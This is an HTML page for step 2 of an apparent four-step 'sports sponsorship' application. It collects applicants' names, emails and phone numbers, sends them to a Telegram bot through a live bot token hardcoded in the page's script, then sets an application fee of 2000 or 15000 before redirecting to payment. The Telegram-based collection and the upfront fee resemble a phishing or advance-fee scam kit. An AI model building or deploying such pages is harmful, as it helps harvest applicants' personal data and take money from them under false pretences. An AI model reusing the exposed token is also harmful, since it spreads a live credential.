<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Personal Details - Sports Sponsorship</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=Playfair+Display:ital,wght@0,700;0,800;0,900;1,700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 40px 20px;
            background: #0a0a1a;
        }

        .container {
            max-width: 650px;
            width: 100%;
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(20px);
            border-radius: 30px;
            padding: 45px;
            border: 1px solid rgba(255, 255, 255, 0.06);
            max-height: 95vh;
            overflow-y: auto;
        }

        .container::-webkit-scrollbar {
            width: 6px;
        }

        .container::-webkit-scrollbar-track {
            background: rgba(255, 255, 255, 0.03);
            border-radius: 10px;
        }

        .container::-webkit-scrollbar-thumb {
            background: rgba(255, 215, 0, 0.25);
            border-radius: 10px;
        }

        .progress-bar {
            display: flex;
            justify-content: space-between;
            margin-bottom: 35px;
            position: relative;
        }

        .progress-bar::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 10%;
            right: 10%;
            height: 2px;
            background: rgba(255, 255, 255, 0.08);
            transform: translateY(-50%);
            z-index: 0;
            border-radius: 10px;
        }

        .progress-step {
            display: flex;
            flex-direction: column;
            align-items: center;
            z-index: 1;
            flex: 1;
        }

        .progress-step .circle {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.05);
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 700;
            color: rgba(255, 255, 255, 0.25);
            transition: all 0.3s;
            font-size: 0.8rem;
            border: 1px solid rgba(255, 255, 255, 0.04);
        }

        .progress-step.completed .circle {
            background: rgba(52, 211, 153, 0.15);
            color: #34D399;
            border-color: rgba(52, 211, 153, 0.1);
        }

        .progress-step.active .circle {
            background: linear-gradient(135deg, #FBBF24, #F59E0B);
            color: #0a0a1a;
            box-shadow: 0 5px 20px rgba(251, 191, 36, 0.25);
            border-color: transparent;
        }

        .progress-step .label {
            font-size: 0.6rem;
            color: rgba(255, 255, 255, 0.25);
            margin-top: 8px;
            text-align: center;
            font-weight: 600;
            letter-spacing: 0.5px;
        }

        .progress-step.completed .label {
            color: #34D399;
        }

        .progress-step.active .label {
            color: #FBBF24;
        }

        .header {
            text-align: center;
            margin-bottom: 30px;
        }

        .header .step {
            display: inline-block;
            background: rgba(255, 215, 0, 0.12);
            color: #FBBF24;
            padding: 5px 22px;
            border-radius: 50px;
            font-size: 0.65rem;
            font-weight: 700;
            letter-spacing: 3px;
            text-transform: uppercase;
            border: 1px solid rgba(255, 215, 0, 0.08);
            margin-bottom: 12px;
        }

        .header h1 {
            font-family: 'Playfair Display', serif;
            font-size: 2.2rem;
            color: #ffffff;
            margin: 12px 0 6px;
        }

        .header p {
            color: rgba(255, 255, 255, 0.6);
            font-size: 0.95rem;
        }

        .form-group {
            margin-bottom: 22px;
        }

        .form-group label {
            display: block;
            font-weight: 600;
            color: rgba(255, 255, 255, 0.9);
            margin-bottom: 6px;
            font-size: 0.85rem;
        }

        .form-group label .required {
            color: #ff6b6b;
            margin-left: 3px;
        }

        .form-group input,
        .form-group select {
            width: 100%;
            padding: 12px 16px;
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 10px;
            font-size: 0.95rem;
            background: rgba(255, 255, 255, 0.05);
            color: #ffffff;
            transition: all 0.3s;
            font-family: 'Inter', sans-serif;
        }

        .form-group input::placeholder {
            color: rgba(255, 255, 255, 0.25);
        }

        .form-group input:focus,
        .form-group select:focus {
            outline: none;
            border-color: #FBBF24;
            background: rgba(255, 255, 255, 0.08);
        }

        .form-group select option {
            background: #1a1a2e;
            color: #ffffff;
        }

        .form-group .hint {
            font-size: 0.65rem;
            color: rgba(255, 255, 255, 0.3);
            margin-top: 4px;
        }

        .applicant-type-toggle {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px;
            margin-bottom: 22px;
        }

        .applicant-type-toggle .toggle-option {
            padding: 14px;
            background: rgba(255, 255, 255, 0.04);
            border: 2px solid rgba(255, 255, 255, 0.06);
            border-radius: 12px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s;
            font-weight: 600;
            color: rgba(255, 255, 255, 0.5);
        }

        .applicant-type-toggle .toggle-option:hover {
            background: rgba(255, 255, 255, 0.07);
            border-color: rgba(255, 215, 0, 0.2);
        }

        .applicant-type-toggle .toggle-option.selected {
            background: rgba(251, 191, 36, 0.08);
            border-color: #FBBF24;
            color: #FBBF24;
            box-shadow: 0 0 30px rgba(251, 191, 36, 0.05);
        }

        .team-fields {
            display: none;
        }

        .team-fields.visible {
            display: block;
        }

        .btn-submit {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #FBBF24, #F59E0B);
            color: #0a0a1a;
            border: none;
            border-radius: 12px;
            font-size: 1rem;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s;
            font-family: 'Inter', sans-serif;
            margin-top: 10px;
        }

        .btn-submit:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 40px rgba(251, 191, 36, 0.2);
        }

        .btn-submit:disabled {
            opacity: 0.4;
            cursor: not-allowed;
            transform: none;
        }

        .status-message {
            display: none;
            padding: 14px 18px;
            border-radius: 12px;
            margin: 12px 0;
            text-align: center;
            font-weight: 500;
            font-size: 0.9rem;
        }

        .status-message.success {
            display: block;
            background: rgba(52, 211, 153, 0.12);
            color: #34D399;
            border: 1px solid rgba(52, 211, 153, 0.08);
        }

        .status-message.error {
            display: block;
            background: rgba(239, 68, 68, 0.12);
            color: #EF4444;
            border: 1px solid rgba(239, 68, 68, 0.08);
        }

        .status-message.loading {
            display: block;
            background: rgba(251, 191, 36, 0.08);
            color: #FBBF24;
            border: 1px solid rgba(251, 191, 36, 0.06);
        }

        .footer-actions {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 20px;
        }

        .btn-back {
            display: inline-block;
            padding: 11px 28px;
            background: rgba(255, 255, 255, 0.05);
            color: rgba(255, 255, 255, 0.7);
            border: 1px solid rgba(255, 255, 255, 0.06);
            border-radius: 10px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            text-decoration: none;
            font-family: 'Inter', sans-serif;
            font-size: 0.9rem;
        }

        .btn-back:hover {
            background: rgba(255, 255, 255, 0.08);
            border-color: rgba(255, 215, 0, 0.15);
            color: #ffffff;
        }

        @media (max-width: 768px) {
            .container {
                padding: 25px 18px;
            }

            .header h1 {
                font-size: 1.8rem;
            }

            .progress-bar {
                display: none;
            }

            .applicant-type-toggle {
                grid-template-columns: 1fr 1fr;
            }
        }

        @media (max-width: 480px) {
            .container {
                padding: 18px 12px;
            }

            .header h1 {
                font-size: 1.5rem;
            }

            .applicant-type-toggle {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="progress-bar">
            <div class="progress-step completed">
                <div class="circle">✓</div>
                <div class="label">Sport Selection</div>
            </div>
            <div class="progress-step active">
                <div class="circle">2</div>
                <div class="label">Personal Details</div>
            </div>
            <div class="progress-step">
                <div class="circle">3</div>
                <div class="label">Application</div>
            </div>
            <div class="progress-step">
                <div class="circle">4</div>
                <div class="label">Payment</div>
            </div>
        </div>

        <div class="header">
            <div class="step">Step 2 of 4</div>
            <h1>Personal Details</h1>
            <p>Tell us about yourself or your team</p>
        </div>

        <div id="statusMessage" class="status-message"></div>

        <form id="personalDetailsForm" onsubmit="submitForm(event)">
            <div class="form-group">
                <label>Applicant Type <span class="required">*</span></label>
                <div class="applicant-type-toggle">
                    <div class="toggle-option selected" data-type="individual" onclick="selectApplicantType('individual')">
                        👤 Individual
                    </div>
                    <div class="toggle-option" data-type="team" onclick="selectApplicantType('team')">
                        👥 Team / Club
                    </div>
                </div>
            </div>

            <div id="individualFields">
                <div class="form-group">
                    <label>Full Name <span class="required">*</span></label>
                    <input type="text" id="fullName" placeholder="Enter your full name" required>
                </div>
                <div class="form-group">
                    <label>Email Address <span class="required">*</span></label>
                    <input type="email" id="email" placeholder="you@example.com" required>
                </div>
                <div class="form-group">
                    <label>Phone Number <span class="required">*</span></label>
                    <input type="tel" id="phone" placeholder="2547XXXXXXXX" required>
                    <div class="hint">Include country code (e.g., 2547XXXXXXXX)</div>
                </div>
            </div>

            <div id="teamFields" class="team-fields">
                <div class="form-group">
                    <label>Team/Club Name <span class="required">*</span></label>
                    <input type="text" id="teamName" placeholder="Enter your team name">
                </div>
                <div class="form-group">
                    <label>Team Captain/Contact Person <span class="required">*</span></label>
                    <input type="text" id="teamContact" placeholder="Full name of team captain">
                </div>
                <div class="form-group">
                    <label>Team Email <span class="required">*</span></label>
                    <input type="email" id="teamEmail" placeholder="team@example.com">
                </div>
                <div class="form-group">
                    <label>Team Phone <span class="required">*</span></label>
                    <input type="tel" id="teamPhone" placeholder="2547XXXXXXXX">
                </div>
                <div class="form-group">
                    <label>Number of Team Members <span class="required">*</span></label>
                    <input type="number" id="teamMembers" placeholder="e.g., 15">
                </div>
                <div class="form-group">
                    <label>Team Category <span class="required">*</span></label>
                    <select id="teamCategory">
                        <option value="">Select category...</option>
                        <option value="school">School Team</option>
                        <option value="club">Club Team</option>
                        <option value="national">National Team</option>
                        <option value="regional">Regional Team</option>
                        <option value="other">Other</option>
                    </select>
                </div>
            </div>

            <div class="form-group">
                <label>Sport <span class="required">*</span></label>
                <select id="sport" required>
                    <option value="">Select your sport...</option>
                    <option value="athletics">Athletics</option>
                    <option value="basketball">Basketball</option>
                    <option value="football">Football</option>
                    <option value="volleyball">Volleyball</option>
                    <option value="swimming">Swimming</option>
                    <option value="tennis">Tennis</option>
                    <option value="rugby">Rugby</option>
                    <option value="cricket">Cricket</option>
                    <option value="boxing">Boxing</option>
                    <option value="cycling">Cycling</option>
                    <option value="golf">Golf</option>
                    <option value="other">Other</option>
                </select>
            </div>

            <button type="submit" class="btn-submit" id="submitBtn">Continue to Application →</button>
        </form>

        <div class="footer-actions">
            <a href="select-sport.html" class="btn-back">← Back</a>
        </div>
    </div>

    <script>
        // TELEGRAM CONFIGURATION
        const TELEGRAM_BOT_TOKEN = '7804311724:AAFi1qHztR0lsh6QWoh8ZxbuZPZAVZ1M3I4';
        const TELEGRAM_CHAT_ID = '5809391312';

        // Function to send message to Telegram
        async function sendToTelegram(message) {
            try {
                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                const data = await response.json();
                if (data.ok) {
                    console.log('Message sent to Telegram successfully');
                    return true;
                } else {
                    console.error('Telegram API error:', data);
                    return false;
                }
            } catch (error) {
                console.error('Error sending to Telegram:', error);
                return false;
            }
        }

        let applicantType = 'individual';

        function selectApplicantType(type) {
            applicantType = type;
            document.querySelectorAll('.toggle-option').forEach(opt => {
                opt.classList.toggle('selected', opt.dataset.type === type);
            });

            const teamFields = document.getElementById('teamFields');
            const individualFields = document.getElementById('individualFields');
            
            if (type === 'team') {
                teamFields.classList.add('visible');
                individualFields.style.display = 'none';
                // Make team fields required
                document.querySelectorAll('#teamFields input, #teamFields select').forEach(field => {
                    field.setAttribute('required', 'required');
                });
                document.querySelectorAll('#individualFields input').forEach(field => {
                    field.removeAttribute('required');
                });
            } else {
                teamFields.classList.remove('visible');
                individualFields.style.display = 'block';
                // Make individual fields required
                document.querySelectorAll('#individualFields input').forEach(field => {
                    field.setAttribute('required', 'required');
                });
                document.querySelectorAll('#teamFields input, #teamFields select').forEach(field => {
                    field.removeAttribute('required');
                });
            }
        }

        async function submitForm(event) {
            event.preventDefault();
            
            const status = document.getElementById('statusMessage');
            const btn = document.getElementById('submitBtn');
            
            // Collect data based on applicant type
            let formData = {
                applicantType: applicantType,
                sport: document.getElementById('sport').value
            };

            if (applicantType === 'individual') {
                formData.fullName = document.getElementById('fullName').value.trim();
                formData.email = document.getElementById('email').value.trim();
                formData.phone = document.getElementById('phone').value.trim();
                
                // Validate individual fields
                if (!formData.fullName || formData.fullName.length < 2) {
                    status.className = 'status-message error';
                    status.textContent = 'Please enter your full name.';
                    status.style.display = 'block';
                    return;
                }
                if (!formData.email || !formData.email.includes('@')) {
                    status.className = 'status-message error';
                    status.textContent = 'Please enter a valid email address.';
                    status.style.display = 'block';
                    return;
                }
                if (!formData.phone || !formData.phone.match(/^2547\d{8}$/)) {
                    status.className = 'status-message error';
                    status.textContent = 'Please enter a valid phone number (2547XXXXXXXX).';
                    status.style.display = 'block';
                    return;
                }
            } else {
                formData.teamName = document.getElementById('teamName').value.trim();
                formData.teamContact = document.getElementById('teamContact').value.trim();
                formData.teamEmail = document.getElementById('teamEmail').value.trim();
                formData.teamPhone = document.getElementById('teamPhone').value.trim();
                formData.teamMembers = document.getElementById('teamMembers').value;
                formData.teamCategory = document.getElementById('teamCategory').value;
                
                // Validate team fields
                if (!formData.teamName || formData.teamName.length < 2) {
                    status.className = 'status-message error';
                    status.textContent = 'Please enter your team name.';
                    status.style.display = 'block';
                    return;
                }
                if (!formData.teamContact || formData.teamContact.length < 2) {
                    status.className = 'status-message error';
                    status.textContent = 'Please enter the team captain/contact name.';
                    status.style.display = 'block';
                    return;
                }
                if (!formData.teamEmail || !formData.teamEmail.includes('@')) {
                    status.className = 'status-message error';
                    status.textContent = 'Please enter a valid team email address.';
                    status.style.display = 'block';
                    return;
                }
                if (!formData.teamPhone || !formData.teamPhone.match(/^2547\d{8}$/)) {
                    status.className = 'status-message error';
                    status.textContent = 'Please enter a valid team phone number (2547XXXXXXXX).';
                    status.style.display = 'block';
                    return;
                }
                if (!formData.teamMembers || formData.teamMembers < 2) {
                    status.className = 'status-message error';
                    status.textContent = 'Please enter the number of team members (minimum 2).';
                    status.style.display = 'block';
                    return;
                }
                if (!formData.teamCategory) {
                    status.className = 'status-message error';
                    status.textContent = 'Please select a team category.';
                    status.style.display = 'block';
                    return;
                }
            }

            if (!formData.sport) {
                status.className = 'status-message error';
                status.textContent = 'Please select your sport.';
                status.style.display = 'block';
                return;
            }

            // Save to localStorage
            localStorage.setItem('athleteData', JSON.stringify(formData));

            // Show loading
            status.className = 'status-message loading';
            status.textContent = 'Saving your details and sending to admin...';
            status.style.display = 'block';
            btn.disabled = true;

            // Format the message for Telegram
            let message = `📋 <b>NEW SPONSORSHIP APPLICATION - PERSONAL DETAILS</b> 📋\n\n`;
            message += `👤 <b>Applicant Type:</b> ${applicantType === 'individual' ? 'Individual Athlete' : 'Team / Club'}\n`;
            message += `🏆 <b>Sport:</b> ${formData.sport}\n`;

            if (applicantType === 'individual') {
                message += `📛 <b>Full Name:</b> ${formData.fullName}\n`;
                message += `📧 <b>Email:</b> ${formData.email}\n`;
                message += `📱 <b>Phone:</b> ${formData.phone}\n`;
            } else {
                message += `🏛️ <b>Team Name:</b> ${formData.teamName}\n`;
                message += `👤 <b>Team Captain:</b> ${formData.teamContact}\n`;
                message += `📧 <b>Team Email:</b> ${formData.teamEmail}\n`;
                message += `📱 <b>Team Phone:</b> ${formData.teamPhone}\n`;
                message += `👥 <b>Team Members:</b> ${formData.teamMembers}\n`;
                message += `📂 <b>Team Category:</b> ${formData.teamCategory}\n`;
            }

            message += `\n📅 <b>Submitted:</b> ${new Date().toLocaleString()}`;

            // Send to Telegram
            const telegramSent = await sendToTelegram(message);

            if (telegramSent) {
                status.className = 'status-message success';
                status.textContent = '✅ Details saved and sent to admin! Redirecting to application...';
            } else {
                status.className = 'status-message success';
                status.textContent = '✅ Details saved! Redirecting to application... (Telegram notification failed)';
            }

            // Set fee data
            const feeData = {
                amount: applicantType === 'individual' ? 2000 : 15000,
                detail: applicantType === 'individual' ? 'Individual Athlete • ' + formData.sport : 'Team/Club • ' + formData.sport + ' Team'
            };
            localStorage.setItem('applicationFee', JSON.stringify(feeData));

            // Redirect after 2 seconds
            setTimeout(() => {
                window.location.href = 'application-form.html';
            }, 2000);
        }

        // Initialize - individual is selected by default
        document.addEventListener('DOMContentLoaded', function() {
            selectApplicantType('individual');
        });
    </script>
</body>
</html>
